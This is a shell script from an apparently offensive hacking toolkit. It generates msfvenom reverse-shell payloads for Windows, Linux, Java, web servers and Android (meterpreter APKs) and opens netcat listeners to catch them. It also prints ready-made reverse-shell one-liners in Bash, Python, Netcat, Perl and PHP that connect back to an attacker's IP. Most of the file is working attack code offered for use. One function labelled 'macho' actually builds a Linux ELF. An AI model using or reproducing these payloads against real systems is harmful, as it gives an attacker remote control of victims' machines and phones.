#!/bin/sh
#!/bin/bash
#!/usr/bin/sh
#!/usr/bin/bash
#!/usr/bin/env sh
#!/usr/bin/env bash
#!/data/data/com.termux/files/usr/bin/sh
#!/data/data/com.termux/files/usr/bin/bash
###############################################################
#-Info--------------------------------------------------------#
#    Enter Your Target, Hack Him, and Get Markdown Report     #
#-About-------------------------------------------------------#
#--╼▰[ Skils ]-╼▰[ MultiMan ]                                 #
#--╼▰[ Part of ]-╼▰[ HacKingPro ]                             #
#--╼▰[ Script Name ]-╼▰[ HacKingPro-Revere-Shells ]           #
#--╼▰[ Author ]-╼▰[ AnLoMinus ]-╼▰[ Leon Yaakobov ]           #
###############################################################
# CREDIT: To All World Creators free Scripts & Tools          #
# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
# GREAT SCRIPTS                                               #
# Location: Made With LOVE IN ISRAEL !                        #
###############################################################
#-Metadata----------------------------------------------------#
#--╼▰[ Version ]-╼▰[ 1.0.0 ]                                  #
#--╼▰[ Source ]-╼▰[ https://github.com/AnLoMinus/HacKingPro ] #
#--╼▰[ inspired ]-╼▰[ https://revshells.com ]                 #
#--╼▰[ Created ]-╼▰[ 15-08-2022 ]                             #
#--╼▰[ Update ]-╼▰[ 15-08-2022 ]                              #
###############################################################
. HacKingProColors

AwesomeLine "Reverse Shell Pro Generator"

#--╼▰[ Main Menu ]--╼▰ [ 04 ]--╼▰ [ Payloads ]--╼▰ [ Reverse Shells ]--╼▰ [ msfVenum ]
msfVenum-HKP(){
  # on the attacker machine to generate files which will yield shell rather than msf session
  # transfer the generated file to the victim machine in order to obtain the shell, change the IP and Port
  Checking_IP_Target
  readLocalPort="    ${ORANGE}LPORT${BWhite}=${BGreen}"
  echo "    ${ORANGE}LHOST${BWhite}=${BGreen}${targetIP}"
  read -p "${readLocalPort}" LPORT

  # war file
  msf_War_File(){
    msfvenom -p java/jsp_shell_reverse_tcp LHOST="${LocalHostIP}" LPORT="${LPORT}" -f war > HacKingPro-Shell.war
  }
  # exe file
  msf_exe_File(){
    msfvenom -p windows/shell_reverse_tcp LHOST="${targetIP}" LPORT="${LPORT}" -f exe > HacKingPro-Shell.exe
  }
  # elf file
  msf_elf_File(){
    msfvenom -p linux/x86/shell_reverse_tcp LHOST="${targetIP}" LPORT="${LPORT}" -f elf > HacKingPro-Shell.elf
  }
  # macho file
  msf_macho_File(){
    msfvenom -p linux/x86/shell_reverse_tcp LHOST="${targetIP}" LPORT="${LPORT}" -f elf > HacKingPro-Shell.elf
  }
  # aspx file
  msf_aspx_File(){
    msfvenom -p windows/shell_reverse_tcp LHOST=${targetIP} LPORT="${LPORT}" -f aspx > HacKingPro-Shell.aspx
  }
  # jsp file
  msf_jsp_File(){
    msfvenom -p java/jsp_shell_reverse_tcp LHOST="${targetIP}" LPORT="${LPORT}" -f raw > HacKingPro-Shell.jsp
  }
  # python file
  msf_python_File(){
    msfvenom -p cmd/unix/reverse_python LHOST="${targetIP}" LPORT="${LPORT}" -f raw > HacKingPro-Shell.py
  }
  # sh file
  msf_sh_File(){
    msfvenom -p cmd/unix/reverse_bash LHOST="${targetIP}" LPORT="${LPORT}" -f raw > HacKingPro-Shell.sh
  }
  # perl file
  msf_perl_File(){
    msfvenom -p cmd/unix/reverse_perl LHOST="${targetIP}" LPORT="${LPORT}" -f raw > HacKingPro-Shell.pl
  }

  # after transferring
  # on the attacker machine
  # syntax: nc -lvnp {port}
  ttab -w nc -lvnp "${LPORT}"

}

#--╼[ Main Menu ]--╼▰ [ 04 ]--╼▰ [ Payloads ]--╼▰ [ Reverse Shells ]--╼▰ [ Android ]
AndroidPayLoadPro(){
  CreateAndroidShell(){
    msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk
  }
  clear
  while true; do
    #statements
    cd "${MainDirectoriyCaseName}"
    clear
    TargetStatusRun
    AndroidPayLoadProMenu=$(echo "
    ${DGrey}┌──${BRed}[${LGreen} NetWorKing ${BRed}]
    ${DGrey}|
    ${DGrey}└──${BRed}[${BGreen}${slowBlink} NetPro ${resetT}${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen} NetWorKingPro ${BRed}]${BGreen}──${resetT}${BYellow}╼▰  ${BRed}[${BGreen}${faintT} NetWorKing Controller ${resetT}${BRed}]

    ${LGreen}╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗     ${LRed}╔═╗╔═╗╦ ╦╦  ╔═╗╔╦╗
    ${LGreen}╠═╣║║║ ║║╠╦╝║ ║║ ║║     ${LRed}╠═╝╠═╣╚╦╝║  ║ ║ ║║
    ${LGreen}╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝     ${LRed}╩  ╩ ╩ ╩ ╩═╝╚═╝═╩╝${DGrey}
    :::::::::::::::: [ TYPE ] ::::::::::::::::::

    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${ORANGE} ${slowBlink}P${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${ORANGE} Planning PayLoad ${BRed}]
    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Export Name ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${payload} ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening IP ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${LocalHostIP} ${BRed}]${BYellow}╼▰
    ${DGrey} ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Listening Port ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${lport} ${BRed}]${BYellow}╼▰
    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} Payload Location ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} ${apv} ${BRed}]${BYellow}╼▰

    ${DGrey} ┏⇢${BYellow}╼▰ ${BRed}[${ORANGE} MeterPreter ${BRed}]${BYellow}╼▰
    ${DGrey} ┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 1 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_http ${BRed}]${BYellow}╼▰
    ${DGrey}  ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 2 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_https ${BRed}]${BYellow}╼▰
    ${DGrey}  ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 3 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter/reverse_tcp ${BRed}]${BYellow}╼▰
    ${DGrey}  ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 4 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_http ${BRed}]${BYellow}╼▰
    ${DGrey}  ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 5 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_https ${BRed}]${BYellow}╼▰
    ${DGrey}  ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 6 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/meterpreter_reverse_tcp ${BRed}]${BYellow}╼▰

    ${DGrey} ┏⇢${BYellow}╼▰ ${BRed}[${ORANGE} Shell ${BRed}]${BYellow}╼▰
    ${DGrey} ┗┲──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 7 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_http ${BRed}]${BYellow}╼▰
    ${DGrey}  ┣──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 8 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_https ${BRed}]${BYellow}╼▰
    ${DGrey}  ┗──⇢${BYellow}╼▰ ${BRed}[${ORANGE} 9 ${BRed}]${BYellow}╼▰ ${BRed}[${LYellow} android/shell/reverse_tcp ${BRed}]${BYellow}╼▰

    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LCyan} ${slowBlink}EP${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LCyan} Export PayLoad ${BRed}]
    ${DGrey}┗┲──⇢${BYellow}╼▰ ${BRed}[${BCyan} Export Location ${BRed}]${BYellow}╼▰ ${BRed}[${BCyan} ${MainDirectoriyCaseName}/$paylaod.apk  ${BRed}]${BYellow}╼▰
    ${DGrey} ┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} msfvenom -p $apv LHOST=${LocalHostIP} LPORT=$lport R > ${MainDirectoriyCaseName}/$payload.apk ${BRed}]${BYellow}╼▰

    ${DGrey}┏➡${BYellow}╼▰ ${BRed}[${LGreen} ${slowBlink}SL${resetT} ${BRed}]${BYellow}╼▰ ${BRed}[${LGreen} Start Listener ${BRed}]
    ${DGrey}┗──⇢${BYellow}╼▰ ${BRed}[${BGreen} Command Executed ${BRed}]${BYellow}╼▰ ${BRed}[${BGreen} nc -l ${lport} ${BRed}]${BYellow}╼▰

    ${BGreen}┏──${BRed}[${DGrey} ~$(pwd) ${BRed}]
    ${BGreen}|
    ${BGreen}┗──${BRed}[${BYellow} $(AnLoMinus) ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Exploitation ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Android PayLoad ${BRed}]${BYellow}╼▰  ${BGreen}  ")
    read -p "${AndroidPayLoadProMenu}" cmd
    case "$cmd" in
      nt|NT|netpro|NetPro)
      Info_LocalNet
      while true; do
        clear
        ToolHeaderRun
        TargetStatusRun
        #statements
        NetWorKingPro
      done
      ;;
      p|P)
      SettingPayload(){
        echo " "
        echo "    ${DGrey} ┏➡ ${BRed}[${ORANGE} Setting PayLoad ${BRed}]${BYellow}╼▰  "

        #statements
        abc1="$(echo "    ${DGrey} ┗┲──⇢ ${BRed}[${ORANGE} Enter File Name ${BRed}]${BYellow}╼▰  ")"
        if [ -z "${LocalHostIP}" ]; then
          abc2="$(echo "    ${DGrey} ┣──⇢ ${BRed}[${ORANGE} Enter Listening IP ${LocalHostIP} ${BRed}]${BYellow}╼▰  ")"
          read -p "${abc2}" LocalHostIP
          if [ -z "${LocalHostIP}" ]; then
            LocalHostIP="127.0.0.1"
          else
            abc3="$(echo "    ${DGrey} [?]──⇢ ${BRed}[${ORANGE} Want Clean IP? ${LocalHostIP} ${BRed}]${BYellow}╼▰  ")"
            read -p "${abc3}" cmd
            case "$cmd" in
              y|Y|yes|Yes)
              LocalHostIP=""
              ;;
              n|N|no|NO)

              echo "    ${DGrey} [!]──⇢ ${BRed}[${ORANGE} Your IP! ${LocalHostIP} ${BRed}]${BYellow}╼▰ ${LocalHostIP}"
              Press_ENTER
              ;;
            esac
          fi
        fi

        #statements
        abc3="$(echo "    ${DGrey} ┗──⇢ ${BRed}[${ORANGE} Enter Listening Port ${BRed}]${BYellow}╼▰  ")"
        if [ -z "${lport}" ]; then
          lport="4444"
        else
          read -p "${abc3}" lport
        fi
      }
      SettingPayload

      ;;
      ep|EP)
      CreateAndroidShell
      Press_ENTER
      ;;
      sl|SL)
      # nc -l ${lport}
      rlwrap nc ${LocalHostIP} ${lport}
      # nc -l ${lport} | nc ${UserName} ${TargetPort}
      Press_ENTER
      ;;
      1)
      clear
      apv='android/meterpreter/reverse_http'
      ;;
      2)
      clear
      apv='android/meterpreter/reverse_https'
      ;;
      3)
      clear
      apv='android/meterpreter/reverse_tcp'
      ;;
      4)
      clear
      apv='android/meterpreter_reverse_http'
      ;;
      5)
      clear
      apv='android/meterpreter_reverse_https'
      ;;
      6)
      clear
      apv='android/meterpreter_reverse_tcp'
      ;;
      7)
      clear
      apv='android/shell/reverse_http'
      ;;
      8)
      clear
      apv='android/shell/reverse_https'
      ;;
      9)
      clear
      apv='android/shell/reverse_tcp'
      ;;
      ls )
      lahs
      ;;
      x|X|exit|quit|Exit )
      clear
      cd ${MainDirectoriy}
      AwesomeLineExit
      break
      ;;
      * )
      echo "$InvalidOption"
      ;;
    esac
  done

}

PrintReverseShells(){
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

ip=$(ifconfig tun0 | grep inet | grep -v inet6 | awk '{print $2}')
if [ $# -eq 0 ]; then
	port="9001" 				# This is the default port if no argument is provided. Change this to your favorite port
else
	port=$1
fi

#Bash
echo -e "${yellowColour}Bash${endColour}"
echo -e "bash -i >& /dev/tcp/$ip/$port 0>&1\r\n"


#Python
echo -e "${yellowColour}Python${endColour}"
echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\r\n"


#Nc
echo -e "${yellowColour}Netcat${endColour}"
echo -e "nc -e /bin/sh $ip $port"
echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f \r\n"

#Perl
echo -e "${yellowColour}Perl${endColour}"
echo -e "perl -e 'use Socket;$i=\"$ip\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\r\n"


#PHP
echo -e "${yellowColour}PHP${endColour}"
echo -e "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
}
